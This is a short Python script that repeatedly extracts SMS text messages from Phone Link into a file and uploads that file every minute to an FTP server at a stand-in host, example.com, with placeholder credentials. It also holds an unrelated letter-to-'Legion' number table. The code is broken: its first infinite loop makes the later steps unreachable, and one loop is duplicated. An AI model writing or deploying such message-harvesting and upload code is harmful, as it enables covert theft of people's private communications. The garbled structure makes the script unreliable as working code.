import time
from ftplib import FTP
import extractor

# Step 2: associate initial of Citizen with a Legion
simple_ams_dict = {'A': 1, 'a': 1, 'B': 2, 'b': 2, 'C': 3, 'c': 3, 'D': 4, 'd': 4, 'E': 5, 'e': 5, 'F': 6, 'f': 6, 'G': 7, 'g': 7, 'H': 8, 'h': 8, 'I': 9, 'i': 9, 'J': 1, 'j': 1, 'K': 2, 'k': 2, 'L': 3, 'l': 3, 'M': 4, 'm': 4, 'N': 5, 'n': 5, 'O': 6, 'o': 6, 'P': 7, 'p': 7, 'Q': 8, 'q': 8, 'R': 9, 'r': 9, 'S': 1, 's': 1, 'T': 2, 't': 2, 'U': 3, 'u': 3, 'V': 4, 'v': 4, 'W': 5, 'w': 5, 'X': 6, 'x': 6, 'Y': 7, 'y': 7, 'Z': 8, 'z': 8}

# Step 3: retrieve text messages from Phone Link and save to file
while True:
    extractor.get_messages()
    time.sleep(60)

# Step 4: update file with new SMS text messages every 60 seconds
while True:
    extractor.get_messages()
    time.sleep(60)

# Step 5: upload text_messages.txt to FTP server
ftp = FTP('example.com')
ftp.login(user='username', passwd='password')

while True:
    with open('text_messages.txt', 'rb') as f:
        ftp.storbinary('STOR text_messages.txt', f)
    time.sleep(60)
